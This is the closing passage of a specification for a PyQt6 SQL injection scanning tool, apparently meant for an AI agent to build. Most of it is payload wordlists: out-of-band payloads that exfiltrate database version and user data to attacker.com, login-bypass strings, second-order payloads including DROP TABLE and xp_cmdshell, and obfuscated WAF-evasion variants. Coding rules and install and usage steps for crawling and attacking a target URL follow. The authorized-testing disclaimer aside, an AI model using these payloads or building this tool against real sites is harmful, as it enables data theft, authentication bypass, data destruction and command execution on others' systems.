' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\share'))--
'; exec master..xp_dirtree '//attacker.com/share'--
'; exec master..xp_fileexist '//attacker.com/share'--
'; DECLARE @x NVARCHAR(100); SET @x='\\\\'+@@version+'.attacker.com\\a'; EXEC xp_dirtree @x--
' AND EXTRACTVALUE(1,(SELECT CONCAT(0x7e,(SELECT user()),0x7e,'.',0x7e,'attacker.com')))--
'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
'; SELECT UTL_FILE.FOPEN('DIRECTORY','file.txt','W') FROM dual--
' UNION SELECT sys.fn_varbintohexstr(hashbytes('MD5',(SELECT @@version)))--
'; EXEC sp_makewebtask 'http://attacker.com/',(SELECT @@version)--
```

### wordlists/auth_bypass_payloads.txt

```
# Authentication Bypass SQL Injection Payloads
# Used in username/password fields of login forms
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
') OR ('1'='1'--
admin'--
admin' #
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR 1=1--
' OR 'x'='x
' OR 'x'='x'--
' OR 1=1 LIMIT 1--
'OR 1=1--
' OR ''='
' OR ''=''--
1' OR '1'='1
1 OR 1=1--
1 OR 1=1#
anything' OR 'x'='x
' OR username IS NOT NULL--
' OR EXISTS(SELECT 1 FROM users)--
' OR (SELECT COUNT(*) FROM users)>0--
' UNION SELECT 1,'admin','admin','admin@x.com'--
' AND 1=0 UNION SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--
```

### wordlists/second_order_payloads.txt

```
# Second-Order SQL Injection Payloads
# These are stored (e.g. in profile/registration) then executed later
' OR 1=1--
admin'--
'+(SELECT 1)+'
' UNION SELECT 1--
\' OR \'1\'=\'1
1'; WAITFOR DELAY '0:0:5'--
'; SELECT SLEEP(5)--
test' OR '1'='1
test'; DROP TABLE users--
test' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
<script>alert(1)</script>' OR '1'='1
' AND 1=2 UNION SELECT user(),2--
admin') OR ('1'='1
' AND 1=1--
name' AND SLEEP(5)--
user@test.com' OR 1=1--
'); SELECT SLEEP(5)--
' OR username='admin'--
test'; INSERT INTO users VALUES('x','x')--
a'; EXEC xp_cmdshell('whoami')--
```

### wordlists/waf_bypass_payloads.txt

```
# WAF Bypass SQL Injection Payloads
# Obfuscated to evade Web Application Firewalls
%27 OR %271%27=%271
%27%20OR%20%271%27=%271
' /*!OR*/ '1'='1
'/**/OR/**/'1'='1
' %0aOR%0a '1'='1
' %09OR%09 '1'='1
'%20/*!50000OR*/1=1--
' UNION%20SELECT%20NULL--
' uNiOn SeLeCt NuLl--
' UnIoN sElEcT nUlL--
'||'1'='1
'||1=1--
' OR 1=1 /*!AND*/ 1=1--
%27+OR+%271%27%3D%271
0x27204f522027313d2731
CHR(39)||CHR(79)||CHR(82)||CHR(39)||CHR(49)||CHR(61)||CHR(49)
' /*!50000OR*/ 1=1--
'%20OR%201%3D1--
' OR/**/'1'/**/='1
/*!50000SELECT*/ NULL--
' OR 1/* comment */=/* comment */1--
1;%00SELECT%20SLEEP(5)--
' OR CHAR(49)=CHAR(49)--
' OR HEX(1)=HEX(1)--
' OR 0x31=0x31--
' OR 1 LIKE 1--
' OR 1 REGEXP 1--
' OR 1 BETWEEN 0 AND 2--
'+OR+'1'='1
%2527 OR %25271%2527=%25271
```

---

## SECTION 20 — CRITICAL RULES FOR THE AI AGENT

Read these before generating any file:

```
RULE 1: Import order in each file must be:
  1. Python stdlib imports
  2. Third-party library imports (PyQt6, requests, bs4)
  3. Local project imports (from core.models import ...)
  Never circular import. core/* files never import from gui/*.

RULE 2: All QThread workers must:
  - Define signals as CLASS-LEVEL attributes (not inside __init__)
  - Call super().__init__() as first line of __init__
  - Override run(self) — never call run() directly, always call .start()
  - Never touch GUI widgets from inside run() — only emit signals

RULE 3: All try/except blocks in worker threads must:
  - Catch specific exceptions where possible (requests.exceptions.*)
  - Never silently swallow exceptions in the main thread
  - In worker threads: catch Exception, emit error signal, continue or return

RULE 4: SQLite access must:
  - Always use self._lock (threading.Lock) around every connection
  - Always use context manager: with sqlite3.connect(...) as conn:
  - Always call conn.row_factory = sqlite3.Row for dict-like access

RULE 5: Every method that accesses self._injector must check:
  if self._injector is not None:
    ... do the thing

RULE 6: PyQt6 signal definitions must use this exact syntax:
  class MyWorker(QThread):
    my_signal = pyqtSignal(int)        ← class-level, NOT inside __init__
  WRONG:
    def __init__(self):
      self.my_signal = pyqtSignal(int) ← THIS CRASHES AT RUNTIME

RULE 7: Never use PyQt5 imports. Always PyQt6:
  CORRECT: from PyQt6.QtWidgets import QApplication
  WRONG:   from PyQt5.QtWidgets import QApplication

RULE 8: RateConfig is imported from core.models in injector.py.
  self.rate_config is available inside _send_job via self.rate_config.
  Do not re-declare it as a local variable.

RULE 9: The wordlist files use '#' for comments.
  load_payloads() must skip lines starting with '#' AND empty lines.

RULE 10: The ScanResult.timestamp field uses default_factory=datetime.now
  Write the dataclass field as:
    timestamp: datetime = field(default_factory=datetime.now)
  Import: from dataclasses import dataclass, field
          from datetime import datetime
```

---

## SECTION 21 — HOW TO INSTALL & RUN

```
═══ STEP 1: INSTALL ═══════════════════════════════════════

git clone <your-repo-url> sqli-engine
cd sqli-engine
sudo bash install.sh

═══ STEP 2: RUN ════════════════════════════════════════════

Option A (recommended):
  sqli-engine

Option B (direct):
  cd /opt/sqli-engine
  source venv/bin/activate
  python3 main.py

Option C (development):
  cd sqli-engine
  python3 -m venv venv
  source venv/bin/activate
  pip install -r requirements.txt
  python3 main.py

═══ STEP 3: USING THE APP ══════════════════════════════════

1.  Launch → app opens on Scanner tab
2.  Paste target URL in the URL field
3.  Click "🌐 Crawl Site" → wait for tree to fill with vectors
4.  Check/uncheck attack categories in Attack Configuration
5.  Set Rate Control:
      Threads: 5–10 (start low)
      Req/Sec: 3–5  (start low)
      Max Reqs: 0 for unlimited or set a cap
6.  Click "▶ Start Scan"
7.  Switch to "📡 Live Results" tab
      Red rows = vulnerability detected
      Click any row to see full request & response
8.  Use ⏸ Pause / ⏹ Stop at any time
9.  After scan → "📁 History" tab → Export CSV or JSON

═══ STEP 4: CUSTOMIZE PAYLOADS ════════════════════════════

Add your own payloads by editing any file in:
  /opt/sqli-engine/wordlists/

One payload per line.
Lines starting with # are comments (skipped).
App reads files fresh on each scan — no restart needed.
```

---

*End of SQLi Engine AI Build Specification v2.0*
*For authorized penetration testing only.*
*NEVER test systems without explicit written permission.*
